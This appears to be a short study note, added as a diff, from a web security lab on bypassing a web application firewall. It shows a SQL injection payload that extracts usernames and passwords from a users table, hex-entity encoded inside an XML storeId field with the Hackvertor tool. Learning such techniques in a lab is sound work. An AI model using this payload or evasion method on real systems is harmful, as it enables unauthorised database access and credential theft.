@@ -1,0 +1,7 @@
+Downloaded Hackvertor and encrypted the SQL injection to bypass the Web Application Firewall (WAF)
+
+XML Encoding:
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users <@/hex_entities></storeId>
+
+Learning:
+Identify the part of the page that is interacting with the backend (or DB) and write SQL injection into them either plane or in the XML (or JSON)
